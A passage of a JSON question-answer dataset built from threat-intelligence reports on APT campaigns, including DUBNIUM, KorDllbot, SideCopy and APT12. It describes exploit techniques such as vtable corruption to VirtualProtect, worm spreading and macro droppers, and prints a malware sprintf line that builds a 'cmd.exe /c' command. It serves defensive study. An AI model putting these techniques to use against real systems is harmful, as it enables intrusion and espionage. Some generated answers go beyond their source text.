ByteArray that is corrupted through the fast memory vulnerability. After setting virtual address as position member, it uses the readUnsignedInt method to read the memory value.\nThe same principle applies to the write32x86 method. It uses the writeUnsignedInt method to write to arbitrary memory location.\nAbove these, the exploit can perform a slightly complex operation like reading multiple bytes using the readBytes method.\nBig Headline: Function object virtual function table corruption\nJust after acquiring the process's memory RW ability, the exploit tries to get access to code execution. This exploit uses a very specific method of corrupting a Function object and using the apply and call methods of the object to\nachieve shellcode execution. This method is similar to the exploit method that was disclosed during the Hacking Team leak. Figure 15 shows how the Function object's virtual function table pointer (vptr) is acquired through a leaked object address, and low-level object offset calculations are performed. The offsets used here are relevant to the Adobe Flash Player's internal data structure and how they are linked together in the memory.\nThis leaked virtual function table pointer is later overwritten with a fake virtual function table's address. The fake virtual function table itself is cloned from the original one and the only pointer to apply method is replaced with the VirtualProtect API. Later, when the apply method is called upon the dummy function object, it will actually call the VirtualProtect API with supplied arguments \u2013 not the original empty call body. The supplied arguments are pointing to the memory area that is used for temporary shellcode storage. The area is made read/write/executable (RWX) through this method.\nOnce the RWX memory area is reserved, the exploit uses the call method of the Function object to perform further code execution. It doesn't use the apply method because it no longer needs to pass any arguments. Calling the call method is also simpler (Figure 17).\nThis shellcode-running routine is highly modularized and you can actually use API names and arguments to be passed to the shellcode-running utility function. This makes shellcode building and running very extensible. Again, this method has close similarity with the code found with the Adobe Flash exploit leaked during the Hacking Team information leak in July 2015.\nNote that the exploit's method of using the corrupted Function object virtual table doesn't work on Microsoft Edge anymore as it has additional mitigation against these kinds of attacks.\nBig Headline: ROP-less shellcode\nWith this exploit, shellcode is not just contiguous memory area, but various shellcodes are called through separate call methods. As you can see from this exploit, we are observing more exploits operate without return-oriented programming (ROP) chains. We can track these calls by putting a breakpoint on the native code that performs the ActionScript call method. For example, the disassembly in Figure 19 shows the code that calls the InternetOpenUrlA API call.\nThis call only retrieves some portion of a portable executable (PE) file's header, but not the whole file. It will do another run of the InternetOpenUrlA API call to retrieve the remaining body of the payload. This is most likely a trick to confuse\nanalysts who will look for a single download session for payloads.\nAnswer this question: How does the DUBNIUM exploit operate without using return-oriented programming (ROP) chains, and what techniques does it employ to potentially confuse analysts?",
    "output": "The DUBNIUM exploit operates without using return-oriented programming (ROP) chains by calling various shellcodes through separate call methods. Instead of relying on a contiguous memory area for shellcode, the exploit employs a modular approach where different parts of the shellcode are executed through distinct calls. For instance, the exploit uses the InternetOpenUrlA API call to retrieve portions of a portable executable (PE) file's header separately, rather than downloading the entire file in a single session. This technique is designed to confuse analysts who might be looking for a single download session for payloads, making it more challenging to detect and analyze the exploit's behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the NetTraveler APT exploit CVE-2010-3333 to infect its victims, and what are the implications of this vulnerability on the attack's success?",
    "output": "CVE-2010-3333 is a stack-based buffer overflow vulnerability in Microsoft Office that allows remote attackers to execute arbitrary code via crafted RTF data. In the context of the NetTraveler APT, this vulnerability is exploited through spear-phishing attacks using Office documents that contain malicious RTF data. The attackers use this vulnerability to deliver malware to the victim's system, which then allows them to extract sensitive information and maintain persistence on the system. The fact that this vulnerability remains effective despite being patched by Microsoft highlights the importance of keeping software up-to-date and the need for additional security measures to prevent such attacks. Furthermore, the use of CVE-2010-3333 in the NetTraveler APT demonstrates the attackers' reliance on exploiting known vulnerabilities to achieve their goals, rather than developing new zero-day exploits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: 36\nposted by: (<http://researchcenter.paloaltonetworks.com/author/bryan-lee/>)Bryan Lee and (<http://researchcenter.paloaltonetworks.com/author/josh-grunzweig/>)Josh Grunzweig on December 22, 2015 5:00 PM filed in: (<http://researchcenter.paloaltonetworks.com/malware-2/>)Malware, (<http://researchcenter.paloaltonetworks.com/unit42/>)Unit 42 tagged: (<http://researchcenter.paloaltonetworks.com/tag/autofocus/>)AutoFocus, (<http://researchcenter.paloaltonetworks.com/tag/bbsrat/>)BBSRAT, (<http://researchcenter.paloaltonetworks.com/tag/microsoft-office/>)Microsoft Office, (<http://researchcenter.paloaltonetworks.com/tag/plugx/>)PlugX, (<http://researchcenter.paloaltonetworks.com/tag/roaming-tiger/>)Roaming Tiger\nIn late 2014, (<http://2014.zeronights.org/assets/files/slides/roaming_tiger_zeronights_2014.pdf>)ESET presented an attack campaign that had been observed over a period of time targeting Russia and other Russian speaking nations, dubbed \"Roaming Tiger\". The attack was found to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware family.\nESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and general information stealing. Based on data collected from Palo Alto Networks (<https://www.paloaltonetworks.com/products/platforms/subscriptions/autofocus.html>)AutoFocus threat intelligence, we discovered continued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a concentration of attacks in late October and continuing into December.\nThe adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and attack vectors. However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific behavior patterns and architecture. We have named this tool \"BBSRAT.\" Targeting and Infrastructure\nAs described in earlier reports on \"Roaming Tiger\", the attack observed in August 2015 used weaponized exploit documents that leave Russian language decoy document files after infecting the system. The files exploit the well\u00adknown Microsoft Office vulnerability, CVE\u00ad2012\u00ad0158, to execute malicious code in order to take control of the targeted systems.\nIn one case, the adversary impersonated an individual from the organization Vigstar, a Russian\u00adbased research organization in charge of the development of satellite communications and special purpose wireless devices for the Russian Federation's defense and security agencies. The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was found on a job board website for a job opening at Vigstar.\nThe rough translation of the body of the email is as follows:\nI send you a \"list of international exhibitions of military, civil and dual\u00adpurpose, conducted in 2015 on the territory of the Russian Federation and foreign states.\" Waiting for your reply!\nFigure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international exhibitions that were conducted on Russian territory in 2015.\ncontrol (C2) infrastructure shows that the newly discovered samples of BBSRAT used the same C2 domains as previously published in the \"Roaming Tiger\" campaign, including transactiona[.]com and futuresgold[.]com. Interestingly, all of the previously published C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all. This may indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose\u00adbuilt variants and/or infrastructure for each of the intended targets.\n\nQuestion: How does the BBSRAT malware differ from the PlugX malware family in terms of its infection mechanisms and architecture, and why might the adversaries have chosen to develop and deploy BBSRAT instead of continuing to use PlugX?\n\nAnswer:",
    "output": "The BBSRAT malware differs from the PlugX malware family in that it uses similar infection mechanisms but has its own specific behavior patterns and architecture. While both malware families exploit vulnerabilities to infect systems, BBSRAT is a completely new tool. The adversaries may have chosen to develop and deploy BBSRAT to evade detection mechanisms that were already aware of PlugX, thereby increasing the chances of successful infiltration and espionage. Additionally, purpose-built variants and infrastructure for each target could help in avoiding overlap and making it harder for defenders to correlate attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Predictions\nUnderstand how the evolving capabilities of these advanced adversaries will affect you in 2015.\nLooking Forward\nPredicting what will happen in 2015 is a challenge, as unforeseen events will inevitably occur and new TTPs from adversaries across the motivational spectrum will continue to shape the threat environment. Before exploring what may be coming in 2015, a brief look back at the predictions for 2014 is in order.\nLast year, CrowdStrike made a number of predictions about the 2014 threat landscape, many of which came to fruition:\n\u2022 North Korean Activity \u2013 CrowdStrike Intelligence predicted that North Korea might use its cyber operations to project power during 2014. This prediction came to fruition at the end of 2014 when a North Korean adversary attacked Sony because of one of the studio's movies that North Korea perceived as an act of war.\n\u2022 windows XP End of life \u2013 Targeted attackers did use exploits such CVe-2014-1776 to target out-of-life Windows XP machines. This continues to be a significant risk, as the existence of legacy Windows XP machines continues to expose an attack surface.\n\u2022 Third-Party Targeting \u2013 2013 saw actors targeting third-party vendors offering DNS, social media, and content management services in order to attack customers of those services. As one example, CrowdStrike observed a number of attacks by the HURRICANe PANDA adversary against DNS and hosting providers in 2014; these attacks were highly likely used to ultimately target those providers' customers.\n\u2022 Sandbox-Aware Malware \u2013 The use of sandbox-aware malware was not new to 2014, but adversaries did make significant use of malware variants capable of detecting if they were being run in sandbox environments. These techniques ranged from detection of sandboxes through system and network artifacts, detection of user activity, and even prompting user interaction as a countermeasure.\nLooking Forward\n\u2022 Use of High-Level Languages \u2013 The 2014 yearly report noted a downward trend in the use of low-level languages like C and a growing trend in the use of high-level languages like C# and Python. During 2014, CrowdStrike did observe several adversaries such as VICeROy TIGeR making heavy use of a malware variant that primarily leveraged Python script.\n\u2022 Activity in the Physical World \u2013 Physical world conflict often leads to related cyber operations, and 2014 was no different. A number of conflicts in the physical space such as those in the South China Sea, Ukraine, and the Middle east all resulted in related cyber operations by targeted intrusion adversaries in China, Russia, and Iran, as well as nationalist and hacktivist actors.\n2015 will undoubtedly hold many surprises and new developments in the realm of computer security. The following section contains estimative judgments about what may be likely trends or occurrences in the next year.\nSmall Headline: RESEARCH AND DEvElOPmENT\nResearch and development during one year can often set the expectations and direction of the next. With this in mind, the CrowdStrike Intelligence team carefully observed patterns and trends in the security research community. Based on the trends of 2014, the following estimates were developed:\n\u2022 It is expected that Let's Encrypt, the first free certificate authority with a pre-installed root certificate in major browsers, will launch in 2015. This service will offer very simple command line provisioning of certificates for use in HTTPS. As a result of the ease of use and availability, it is likely that an increasing amount of Internet traffic will be encrypted. As HTTP traffic becomes less common, it is more likely to be suspect and subject to closer inspection. This opens the possibility that more adversaries may look to leverage SSL certificates for command and control. Additionally, Content Security Policy (CSP) for webpages means that XSS-attacks will become more complicated to mount. In 2015, it is expected that\nLooking Forward\ntwo-factor authentication will be more widely deployed across enterprise and cloud services, which will hopefully hamper the effectiveness of credential and banking phishing operations.\n\u2022 Adversaries are constantly advancing their capabilities; overseas, cryptography and its application has continued to dominate the technology news, beginning with revelations from the Snowden leaks. CrowdStrike assesses it is possible that adversaries will deploy more sophisticated encryption and key agreement schemes to hamper interception by security professionals and intelligence services.\n\u2022 In 2015, a number of sandboxes using hypervisor introspection will become available, both commercially and in open source. Introspection allows a sandbox to instrument a virtual machine through the hypervisor; this provides additional stealth to the sandbox, allowing it to avoid detection. It remains to be seen whether malware authors will completely cease their efforts to detect traditional sandboxing solution and/or whether they will try to subvert introspection-based sandboxes. Given the difficulty in detection, and the speed at which new technologies are adopted, it is likely that adversaries will continue to detect traditional sandboxes in 2015, with more advanced adversaries exploring techniques to identify or evade introspection-based systems.\n\u2022 Embedded devices, regardless of whether they are home routers or industrial control systems, will be increasingly targeted. One of the primary factors impacting this belief is the increasing pace of vulnerability disclosures in the embedded space and in the underlying software they leverage. The increasing prevalence and popularity of Internet of Things (IoT) devices, discussed in more detail below, is another factor in this likely targeting. This targeting will likely occur across a variety of threat actors. In 2014, we saw the compromise  of home router technology used to build an embedded proxy layer used to mask the identity of the attacker.\nLooking Forward\n\u2022 Internet of Things (IoT) devices are still in their infancy and the concept of IoT has not yet become widely adopted or even available to the average end user. There are, however, a large number of devices being sold already that would fit under the IoT umbrella, even if they do not make use of the IoT communication standards. While targeted attacks against IoT devices are unlikely at this time, the potential to abuse IoT devices for amplified DDOS as well as disrupting IoT networks through DOS'ing of central control infrastructure might well be possible.\n\nQ: Why are embedded devices and Internet of Things (IoT) devices expected to become increasingly targeted by various threat actors in 2015?",
    "output": "A: Embedded devices and IoT devices are expected to become increasingly targeted due to the rising pace of vulnerability disclosures in the embedded space and the underlying software they use. The growing prevalence and popularity of IoT devices also contribute to this trend. Threat actors may exploit these devices to create embedded proxy layers, mask their identities, or conduct amplified DDoS attacks. Additionally, disrupting IoT networks through denial-of-service attacks on central control infrastructure is a potential threat vector.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: THE KORDLLBOT BACKDOOR FAMILY\nKorDllbot is a family of small/medium size trojans that usually are configured to be installed as services.\nSamples can vary a great deal in functionality - from just listening on a port and accepting commands, to harvesting data, to actively spreading over SMB. This functionality seems almost modular, using different encryption and encoding methods and different C&C command words. Build environment for the early generations was typically Visual Studio 6.\nKorDllbots use C&C commands starting at different integer offsets depending on version. Here, versions 1.1/1.2/1.5, 1.03, 1.04.2 and 1.05.2 sending success or error status back to remote control client after file deletion.\nCommon capability seen in the KorDllbot family is:\n- Get bot status\n- List logical drives\n- List directory\n- Change directory\n- Get process list\n- Kill process\n- Execute file\n- Delete file\n- Change file time\n- Execute shell command\n- Download file\n- Upload file\n- Get volume serial number\n- Get file attributes\nMost of these trojans use encrypted or encoded C&C communication, but the algorithms vary between versions.\nA very common trait in these bots is for API's to be dynamically declared through the use of LoadLibrary and GetProcAddress, where the API names are obfuscated, encoded or encrypted in some way, and decoded before they are declared. This is not unique to KorDllbots, but is a fairly static common behavior for this family.\nAnother trait which is peculiar enough to be an identifier in itself is the way this malware creates command line statements. The construction of the command line is deliberately obfuscated by concatenating string segments. Typically, this looks something like this:\nsprintf(commandline, \"%sd.e%sc %s >%s 2>&1\", \"cm\", \"xe /\", command, logfile_name); //command and tempfile_name are arbitrary strings inserted by the malware.\nThis translates to \"cmd.exe /c command>logfile_name 2>&1\", i.e execute command and direct output to a log file. This particular construct, with very little deviation, is used in almost all KorDllbots and its successors. We'll reference this by the name \"CMXE\" string obfuscation later on in the paper.\nThe earliest KorDllbot we have has a compile timestamp of July 1st. 2007. This date is however possible to falsify. The earliest verified time KorDllbots were observed was mid-2011, with the executable with the sha256 hash of 87bae4517ff40d9a8800ba4d2fa8d2f9df3c2e224e97c4b3c162688f2b0d832e. This sample listens for connections on port 179 and allows remote access through an encoded proprietary protocol.\nMedium Headline: Already here we can note a connection to the Sony case. Current antivirus detection of this file includes the names Destover and Escad, names introduced by AV vendors in connection with the Sony attack. It has a compile date (May 17th 2011) and import hash that matches data from the US-CERT advisory (2).\nThis malware contains a very noticeable API string obfuscation algorithm where API strings have been broken up into segments of varying size using either spaces or dots as filler. This is presumably done to avoid detection by anti-malware solutions or YARA rules. We have called this technique Chopstring, just to have a reference later on. ChopString is used by many KorDllbots, and also shows up elsewhere in the Sony intrusion case.\nVery Small Headline: THE MicrosoftCodeSigningPCA CERTIFICATE CLUSTER\nThe KorDllbot sample 87bae4517ff40d9a8800ba4d2fa8d2f9df3c2e224e97c4b3c162688f2b0d832e is digitally signed using a non-original (and thus non-validating) Microsoft certificate. The file is in reality self-signed.\nThis signature doesn't say much about who made it. However, the way the certificate is constructed is peculiar. The faked issuer in this case is Microsoft Code Signing PCA. The real Microsoft Code Signing PCA is one of the certificate authorities used by Microsoft to sign their software.\nThe Subject - i.e. the entity the certificate is supposed to have been issued to - is also Microsoft Code Signing PCA. This is a construct never seen in legitimate certifications, and it is rare enough in faked certificates that it's worthwhile checking other malware signed in this way.\nBlue Coat maintains a database of code signing certificates which we can mine for this type of information.\nWe found several certificate serial numbers matching this pattern. Each serial number identifies a certificate used to sign a small number of malware samples \u2013 typically on the range of one to four samples, with one outlier at eight samples.\nThe malware can be clustered into a few main buckets. Some malwares of different families are signed by the same certificate, which creates a high-confidence link between them.\nThis collection of signed malware is dominated by KorDllbots. These are not all identical, there is considerable variation between generations in functionality, encoding and encryption methods, but the similarities in overall structure; string usage etc. is quite unmistakable. (See appendix for a full list of executables with this type of signature.)\nOther samples include keyloggers, SMB worms, Yahoo Messenger-communicating backdoor trojans and the legitimate ProxyMini lightweight proxy server.\nMedium Headline: The malware samples 163571bd56001963c4dcb0650bb17fa23ba23a5237c21f2401f4e894dfe4f50d and e0cd4eb8108dab716f3c2e94e6c0079051bfe9c7c2ed4fcbfdd16b4dd1c18d4d in the cluster of signed malware do not look like KorDllbots at first glance.\nThe usual service DLL dropper is here replaced with a worm component. After installation and reboot, this worm generates random IP addresses and attempts to connect to the admin$ share on remote machines using the hard coded usernames \"administrator\" and \"db2admin\". The malware contains a list of common passwords and it will also construct passwords based on the username. If successful, the worm copies itself to the remote machine's system directory and installs it as a service there.\nIn addition to spreading, these samples drop a backdoor component which is somewhat different in structure to the \"standard\" KorDllbots. The dropper code logic used in these worms is however used in other KorDllbot dropper samples and is unmistakable - the strings \"DGTSIGN\" and \"www.goog1e.cn\" are markers which the malware uses to locate its embedded content.\n9bc8fe605a4ad852894801271efd771da688d707b 9fbe208106917a0796bbfdc\nThis is a KorDllbot dropper\ne0cd4eb8108dab716f3c2e94e6c0079051bfe9c7c 2ed4fcbfdd16b4dd1c18d4d\nThis is an SMB worm\n\nWhat is the 'CMXE' string obfuscation technique used by KorDllbots, and how does it work? Why is this technique significant in identifying KorDllbot variants?",
    "output": "The 'CMXE' string obfuscation technique involves constructing command line statements by concatenating string segments. For example, the command 'cmd.exe /c command>logfile_name 2>&1' is constructed by combining parts like '%sd.e%sc %s >%s 2>&1', 'cm', 'xe /', 'command', and 'logfile_name'. This technique is significant in identifying KorDllbot variants because it is a consistent and distinctive method used across almost all KorDllbots and their successors. The deliberate obfuscation of the command line construction helps in evading detection and provides a reliable identifier for this malware family.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nThe attackers referred to as APT12 (also known as IXESHE, DynCalc, and DNSCALC) recently started a new campaign targeting organizations in Japan and Taiwan. APT12 is believed to be a cyber espionage group thought to have links to the Chinese People's Liberation Army. APT12\u2032s targets are consistent with larger People's Republic of China (PRC) goals. Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan. Additionally, the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure, as APT12 used the same strategy after compromising the New York Times in Oct 2012. Much like Darwin's theory of biological evolution, APT12 been forced to evolve and adapt in order to maintain its mission.\nThe new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog \"(<http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/>)Illuminating The Etumbot APT Backdoor.\" FireEye refers to the Etumbot backdoor as RIPTIDE. Since the release of the Arbor blog post, FireEye has observed APT12 use a modified RIPTIDE backdoor (<http://www.fireeye.com/blog/technical/2013/08/survival-of-the-fittest-new-york-times-attackers-evolve-quickly.html>)that we call HIGHTIDE. This is the second time FireEye has discovered APT12 retooling after a public disclosure. As such, FireEye believes this to be a common theme for this APT group, as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations.\nFireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT. Both backdoors were dropped from malicious documents built utilizing the \"Tran Duy Linh\" exploit kit, which exploited CVE-2012-0158. These documents were also emailed to organizations in Japan and Taiwan. While APT12 has previously used THREEBYTE, it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE. Similarly, WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified. However, the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12.\nRead the text above and answer this question: What are the characteristics of the new campaign conducted by APT12, and how do these characteristics align with broader geopolitical interests?",
    "output": "The new campaign conducted by APT12 targeted organizations in Japan and Taiwan, aligning with broader People's Republic of China (PRC) goals and self-interests in Taiwan. This campaign utilized modified backdoors like HIGHTIDE, which is an evolved version of the previously known RIPTIDE backdoor. Additionally, the campaign involved the use of malicious documents exploiting CVE-2012-0158, delivered via email. These characteristics demonstrate APT12's strategic alignment with PRC objectives and its ability to adapt and evolve in response to public exposure and changing cybersecurity landscapes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SUMMARY\n\u2022 Cisco Talos is tracking an increase in the SideCopy APT's activities targeting government personnel in India using themes and tactics similar to APT36 (aka Mythic Leopard and Transparent Tribe).\n\u2022 SideCopy is an APT group that mimics the Sidewinder APT's infection chains to deliver their own set of malware.\n\u2022 We've discovered multiple infection chains delivering bespoke and commodity remote access trojans (RATs) such as CetaRAT, Allakore and njRAT.\n\u2022 Apart from the three known malware families utilized by SideCopy, Talos also discovered the usage of four new custom RAT families and two other commodity RATs known as \"Lilith\" and \"Epicenter.\"\n\u2022 Post-infection activities by SideCopy consist of deploying a variety of plugins, ranging from file enumerators to credential-stealers and keyloggers.\nBig Headline: WHAT'S NEW?\nCisco Talos has observed an expansion in the activity of SideCopy malware campaigns, targeting entities in India. In the past, the attackers have used malicious LNK files and documents to distribute their staple C#-based RAT. We are calling this malware \"CetaRAT.\" SideCopy also relies heavily on the use of Allakore RAT, a publicly available Delphi-based RAT.\nRecent activity from the group, however, signals a boost in their development operations. Talos has discovered multiple new RAT families and plugins currently used in SideCopy infection chains.\nTargeting tactics and themes observed in SideCopy campaigns indicate a high degree of similarity to the Transparent Tribe APT (aka APT36) also targeting India. These include using decoys posing as operational documents belonging to the military and think tanks and honeytrap-based infections.\nBig Headline: HOW DID IT WORK?\nSideCopy's infection chains have remained relatively consistent with minor variations \u2014 using malicious LNK files as entry points, followed by a convoluted infection chain\ninvolving multiple HTAs and loader DLLs to deliver the final payloads.\nTalos also discovered the usage of other new RATs and plugins. These include DetaRAT, ReverseRAT, MargulasRAT and ActionRAT. We've also discovered the use of commodity RATs such as njRAT, Lilith and Epicenter by this group since as early as 2019.\nSuccessful infection of a victim results in the installation of independent plugins to serve specific purposes such as file enumeration, browser password stealing and keylogging.\nBig Headline: SO WHAT?\nThese campaigns provide insights into the adversary's operations:\n\u2022 Their preliminary infection chains involve delivering their staple RATs.\n\u2022 Successful infection of a victim leads to the introduction of a variety of modular plugins.\n\u2022 Development of new RAT malware is an indication that this group of attackers are rapidly evolving their malware arsenal and post-infection tools since 2019.\n\u2022 Their current infrastructure setup indicates a special interest in victims in Pakistan and India.\nMedium Headline: EARLY INFECTION CHAIN\nThe earliest discovered infection chain consisted of a LNK file that pulled down and executed an HTA from a remote\nlocation. This HTA would decode and instrument a loader DLL in memory to drop CetaRAT and another DLL (DUser. dll) (Figure 1).\nThe dropped DLL is side-loaded into credwiz.exe. The DLL then executes CetaRAT on the infected endpoint, thereby completing the infection chain.\nThe actors used this method in 2019 and have evolved it since then. This primitive infection chain doesn't consist of decoy documents or images and is missing the Allakore RAT component (Figure 2).\nMedium Headline: LATEST CETARAT INFECTION CHAINS\nBeginning 2020 and into 2021, we saw the attackers improve their infection chains. These infections also begin with malicious LNK files delivered to the victims. However, what follows is a combination of three HTA files, three loader DLLs, two instances of CetaRAT in some cases, and Allakore. This indicates an effort to modularize the attack chains, although it's over-modularized in this case.\nThe latest infection chains have also adopted the practice of displaying a decoy document (PDF) or image to the victims (Figure 3).\nSmall Headline: Stage No. 2A \u2014 Loader DLL\nThe malicious Dot Net-based loader DLL is responsible for:\n\u2022 Decompressing a decoy PDF and displaying it to the victim on the endpoint.\n\u2022 Downloads another malicious HTA (Stage No. 3A) from a remote URL and executes it on the endpoint.\n\u2022 Downloads and executes another malicious HTA file (Stage No. 4) from a remote URL.\nThe decoy document displayed to the victim in this case is an internal Indian Ministry of Defense (MoD) circular related to their Human Resources Management System (HRMS) (Figure 5).\nMedium Headline: NJRAT INFECTIONS\nAnother recently discovered infection chain (Figure 6) used by SideCopy completely abandons CetaRAT and Allakore and uses njRAT instead. This infection chain is simpler than the ones seen previously.\nA second variation of njRAT infection chain uses self-extracting RAR-based dropper executables that consists of:\n\u2022 Malicious VB script to set up persistence for njRAT deployed by the dropper.\n\u2022 njRAT binary  dropped and executed by the dropper.\n\u2022 The decoy document is usually a PDF displayed to the victim. These PDFs mainly consist of themes related to the Indian Army and government.\nSome examples of the self-extracting dropper filenames:\n\u2022 Indian Army Restructring And Re-Organiza-tion.pdf.exe\n\u2022 director_general_level_border_coordination_ conference.pdf.exe\n\u2022 Phase-3 of Nationwide Covid-19 Vaccination Registration.pdf.exe\nMedium Headline: MSI-BASED INFECTION CHAIN\nAround mid-2020, we observed a deviation from the LNK-based infection chain. In this case, the attackers hosted a malicious archive (ZIP) on an attacker-controlled website freewindowssoftware[.]com. The ZIP file contained an MSI file posing as an installer for the \"Libre Video Locker\" application. On installation, the malicious MSI would install Allakore RAT into the \"Program Files\\Libre Software Corporation\\LibreVideoLocker\" folder (Figure 7).\nThe final payloads consisted of three components:\n\u2022 Loader EXE: Executed first and masquerades as a Libre video player application. It is, however, meant to run Allakore and the malicious BAT file.\n\u2022 Persistence BAT file: Used to set up persistence for Allakore via the registry HKCU\\..\\Run key.\n\u2022 Allakore RAT exe: This is a copy of the Allakore RAT built in 2019, instrumented to communicate with a known SideCopy C2 IP.\nMedium Headline: RATS\nSideCopy infections utilize a number of RATs. The RAT payloads discovered by Talos so far are:\n\u2022 CetaRAT: SideCopy's staple RAT first seen in the wild in 2019. This was already disclosed publicly. We are calling it \"CetaRAT\" to identify it throughout this research piece.\n\u2022 DetaRAT \u2014 C#-based RAT: A previously unknown C#-based RAT that contains several RAT capabilities similar to CetaRAT.\n\u2022 ReverseRAT: Another previously undiscovered C#-\nbased reverse shell that also monitors removable drives. It is based on CetaRAT.\n\u2022 MargulasRAT: This is another custom RAT used as part of SideCopy operations. The dropper for MargulasRAT masquerades as a VPN application from India's National Informatics Centre (NIC).\n\u2022 Allakore: Allakore is a Delphi-based RAT first observed in 2015. This RAT has been used by SideCopy extensively, along with CetaRAT.\n\u2022 ActionRAT: ActionRAT is another Delphi-based RAT used in SideCopy's operations. At first glance, it looks quite similar to Allakore but is distinct in its implementation. We also found a C#-based version of the RAT, indicating that the attackers have ported it to the Dot Net platform, as well.\n\u2022 Lilith: Lilith is a C++-based RAT first observed in 2016. SideCopy used a customized version of Lilith in early 2019. Lilith has also been utilized by another APT named \"TICK\" in 2018 - 19.\n\u2022 EpicenterRAT: Epicenter is another commodity RAT observed in the wild since 2012. SideCopy's usage of Epicenter dates back to as early as 2018 - 19.\nMedium Headline: PLUGINS\nIn addition to full-fledged RATs, SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint:\n\u2022 File manager:  A file management component that can enumerate, download and upload files on the endpoint from/to the C2.\n\u2022 Keyloggers: There are two keyloggers used by Side-Copy.\n\u25cb Xeytan: A publicly available C#-based keylogger available since 2016.\n\u25cb Lavao: Another C#-based keylogger.\n\u2022 Browser credential stealers: Again, there are two types of stealers used:\n\u25cb C-based stealer component to steal passwords from Firefox and Chrome.\n\u25cb C#-based stealer component to steal Chromium browser passwords.\n\u2022 Nodachi: A previously unknown set of plugins utilized by SideCopy we're calling \"Nodachi.\" These Golang-based plugins have reconnaissance and file-stealing abilities targeting an Indian multi-factor authentication app known as \"Kavach.\"\nMedium Headline: DETARAT\nDetaRAT is a previously unknown C#-based implant used by SideCopy. This implant uses a different set of command codes (Figure 9) with a hardcoded key for communicating with its C2 servers. Its malicious capabilities include:\n\u2022 Files management: Create, move, rename and delete directories and files.\n\u2022 File enumeration: Retrieves detailed directory and file information recursively, including creation and last access times.\n\u2022 Exfiltration and infiltration: Download and upload files from and to the C2.\n\u2022 Audio: Record and upload audio files.\n\u2022 Remote control: Control mouse cursor and clicks.\n\u2022 Hosts file: Retrieve and send / etc/hosts file contents.\n\u2022 Installed Software: Exfiltrate details of installed software from registry.\n\u2022 Execution: Run arbitrary commands on the endpoint via cmd.exe.\n\u2022 Clipboard: Get and set clipboard data.\n\u2022 Sysinfo: The following information is sent to the C2 to fingerprint the endpoint:\n\u25cb IP and MAC addresses.\n\u25cb Installed anti-virus software.\n\u25cb Processor and GPU info, RAM info, system uptime, OS details, battery charge and life.\n\u25cb Hostname, current username and screen dimensions.\n\nWhat insights do SideCopy's campaigns provide about the adversary's operations and infrastructure? Discuss their targeting tactics and the development of new malware.",
    "output": "A: SideCopy's campaigns reveal several insights into the adversary's operations. Their preliminary infection chains involve delivering staple RATs like CetaRAT and Allakore. Upon successful infection, they introduce a variety of modular plugins for tasks such as file enumeration, browser password stealing, and keylogging. The development of new RAT malware like DetaRAT, ReverseRAT, MargulasRAT, and ActionRAT indicates rapid evolution in their malware arsenal and post-infection tools since 2019. Their infrastructure setup shows a special interest in victims in Pakistan and India, with targeting tactics and themes similar to those used by APT36 (Transparent Tribe), including decoys posing as military and think tank documents and honeytrap-based infections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Gholee\nOur investigation of the Gholee malware started following a detection of a suspicious \u0141le that was sent in an email to an undisclosed recipient. The \u0141le name was 'Operation Protective Edge.xlsb' (MD5: d0c3f4c9896d41a7c42737134ffb4c2e).\nThe \u0141le was uploaded to Virus Total the \u0141rst time on 10 August 2014, from Israel. At that time it was not detected as malicious by any of the 52 tested antivirus engines. Nine days later, it was\nuploaded again to Virus total, again from Israel. This time it was detected as malicious only by Kaspersky, as Trojan-Dropper.MSExcel.Agent.ce.\nBig Headline: Infection\nUpon opening the \u0141le a message is displayed, saying:\n\"Due to security considerations I consciously hid the Informations. It will be visible for you by enabling content above.\"\nThis is a social engineering tactic meant to lure the victim into enabling Macro content. If enabled, the message disappears, and the following information is presented to the victim (it is possible that the unreadable characters in the screenshot below are the result of an encoding error in our lab environment, and that the victim would see different, readable content).\nBig Headline: Technical Analysis\nAnalysis of the Macro code reveals the following structure:\nIn order to avoid detection by protection measures such as computer antivirus and intrusion detection systems, ASCII\ncharacters codes are used instead of actual characters. The ASCII codes are converted to strings as they are concatenated into a single variable within a function\nTens of these functions then concatenated, creating a single PE \u0141le\n[2] Finally, the \u0141le is saved to NTUSER.data.{GUIDE}.dll (MD5: 48573a150562c57742230583456b4c02) and the function ShellExecte  is used to run it under cmd.exe /C and Rundll32  This is in order to hide the process.\nThe Dll \u0141le is obfuscated and includes various mechanism to hide from Debuggers such as Ollydbg and IDA and from Sandbox software such as Cuckoo and Anubis.\nAnalyzing the \u0141le, we have found an interesting entry point called gholee.\n[4] A quick Facebook search for that name and Iran discovered Gholee is a popular Iranian singer:\nMedium Headline: Communication\nWhen run, the DLL 